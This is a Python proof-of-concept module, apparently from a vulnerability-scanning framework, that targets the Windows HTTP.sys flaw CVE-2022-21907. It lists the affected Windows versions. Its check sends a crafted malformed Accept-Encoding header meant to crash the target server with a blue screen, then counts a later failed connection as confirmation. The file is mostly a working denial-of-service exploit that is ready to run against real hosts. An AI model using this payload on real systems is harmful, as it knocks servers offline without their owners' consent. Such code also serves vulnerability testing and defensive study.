# coding:utf-8  
import requests
from lib.core.common import url_handle,get_random_ua
from lib.core.poc import POCBase
# ...
import urllib3
import time
urllib3.disable_warnings()

class POC(POCBase):

    _info = {
        "author" : "jijue",                      # POC作者
        "version" : "1",                    # POC版本，默认是1  
        "CreateDate" : "2022-01-01",        # POC创建时间
        "UpdateDate" : "2022-01-01",        # POC创建时间
        "PocDesc" : """
            本POC只可实现蓝屏  
        """,                                # POC描述，写更新描述，没有就不写

        "name" : "Windows HTTP协议栈远程代码执行漏洞(CVE-2022-21907)",                        # 漏洞名称
        "VulnID" : "CVE-2022-21907",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName" : "",                     # 漏洞应用名称
        "AppVersion" : """
                Windows Server 2019 (Server Core installation)
                Windows Server 2019
                Windows 10 Version 21H2 for ARM64-based Systems
                Windows 10 Version 21H2 for 32-bit Systems
                Windows 11 for ARM64-based Systems
                Windows 11 for x64-based Systems
                Windows Server, version 20H2 (Server Core Installation)
                Windows 10 Version 20H2 for ARM64-based Systems
                Windows 10 Version 20H2 for 32-bit Systems
                Windows 10 Version 20H2 for x64-based Systems
                Windows Server 2022 (Server Core installation)
                Windows Server 2022
                Windows 10 Version 21H1 for 32-bit Systems
                Windows 10 Version 21H1 for ARM64-based Systems
                Windows 10 Version 21H1 for x64-based Systems
                Windows 10 Version 21H2 for x64-based Systems
                Windows 10 Version 1809 for ARM64-based Systems
                Windows 10 Version 1809 for x64-based Systems
                Windows 10 Version 1809 for 32-bit Systems
            """,                  # 漏洞应用版本
        "VulnDate" : "2022-01-01",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc" : """
            Microsoft Windows HTTP 协议栈（HTTP.sys）存在远程代码执行漏洞，未经身份认证的远程攻击者可通过向目标 Web 服务器发送特制的HTTP请求来利用此漏洞，
            从而在目标系统上执行任意代码。利用此漏洞不需要身份认证和用户交互，微软官方将其标记为蠕虫漏洞，微软建议优先修补受此漏洞影响的服务器。
            
            此漏洞影响启用了HTTP Trailer Support的系统，默认情况下，Windows Server 2019 和 Windows 10 版本 1809不易受到攻击。
        """,                                # 漏洞简要描述

        "fofa-dork":"""
        
        """,                     # fofa搜索语句
        "example" : "",                     # 存在漏洞的演示url，写一个就可以了
        "exp_img" : "",                      # 先不管  
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False,""]
        url = self.target + "" # url自己按需调整
        

        headers = {"User-Agent":get_random_ua(),
                    "Connection":"close",
                    # "Content-Type": "application/x-www-form-urlencoded",
                    }
        
        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
            if req.status_code == 200 :
                poc_headers = {
                            'Accept-Encoding': 'AAAAAAAAAAAAAAAAAAAAAAAA, '
                               'BBBBBBcccACCCACACATTATTATAASDFADFAFSDDAHJSKSKKSKKSKJHHSHHHAY&AU&**SISODDJJDJJDJJJDJJSU**S, '
                               'RRARRARYYYATTATTTTATTATTATSHHSGGUGFURYTIUHSLKJLKJMNLSJLJLJSLJJLJLKJHJVHGF, '
                               'TTYCTCTTTCGFDSGAHDTUYGKJHJLKJHGFUTYREYUTIYOUPIOOLPLMKNLIJOPKOLPKOPJLKOP, '
                               'OOOAOAOOOAOOAOOOAOOOAOOOAOO, '
                               '****************************stupiD, *, ,'
                        }
                try:
                    req = requests.get(url,headers = poc_headers , proxies = self.proxy ,timeout = 5,verify = False)
                except requests.exceptions.ReadTimeout as e:
                    try:
                        time.sleep(10)
                        req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
                    except requests.exceptions.ConnectionError as e:
                        vuln = [True,req.text]
            else:
                vuln = [False,req.text]
        except Exception as e:
            raise e
        
        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False
        
        return vuln

    def _attack(self):
        return self._verify()